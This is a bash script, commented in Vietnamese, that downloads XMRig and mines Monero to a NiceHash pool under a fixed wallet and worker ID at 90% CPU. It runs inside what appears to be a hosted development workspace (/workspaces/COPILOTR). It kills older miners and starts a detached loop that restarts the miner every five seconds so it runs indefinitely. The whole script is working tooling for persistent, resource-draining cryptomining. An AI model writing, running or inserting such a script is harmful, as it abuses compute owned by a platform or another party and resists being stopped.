#!/bin/bash
set -e

echo "========================================"
echo "🚀 XMRig AUTO MINER - NICEHASH (90% CPU)"
echo "========================================"

cd /workspaces/COPILOTR

# Xóa sạch cũ
rm -rf xmrig-miner
mkdir -p xmrig-miner
cd xmrig-miner

echo "📥 Tải XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz -O xmrig.tar.gz
tar -xzf xmrig.tar.gz
rm xmrig.tar.gz

cd xmrig-6.26.0

chmod +x xmrig

echo "📝 Tạo config NiceHash (90% CPU)..."
cat > config.json << 'EOF'
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 90,
        "huge-pages": false
    },
    "opencl": false,
    "cuda": false,
    "donate-level": 1,
    "log-file": "/workspaces/COPILOTR/miner.log",
    "pools": [
        {
            "algo": "rx",
            "coin": "monero",
            "url": "randomxmonero.auto.nicehash.com:9200",
            "user": "NHbTzqmMyQaepqAPoZebySJ6FAHHA1DpGnDM.GUNDAM",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

echo "🛑 Dừng miner cũ..."
pkill -f xmrig 2>/dev/null || true

echo "🔥 Khởi động miner NiceHash (90% CPU - chạy mãi mãi)..."
nohup bash -c '
    while true; do
        echo "[$(date)] Khởi động XMRig NiceHash 90% CPU..." >> /workspaces/COPILOTR/miner.log
        ./xmrig -c config.json >> /workspaces/COPILOTR/miner.log 2>&1
        echo "[$(date)] Miner bị tắt, restart sau 5 giây..." >> /workspaces/COPILOTR/miner.log
        sleep 5
    done
' > /dev/null 2>&1 &

sleep 10

if pgrep -f xmrig > /dev/null; then
    echo "✅ MINER NICEHASH ĐÃ CHẠY Ở 90% CPU!"
    echo "📊 Xem log realtime:   tail -f /workspaces/COPILOTR/miner.log"
    echo "⛔ Dừng hoàn toàn:     pkill -f xmrig"
else
    echo "❌ Lỗi. Paste 20 dòng cuối miner.log cho mình xem."
fi
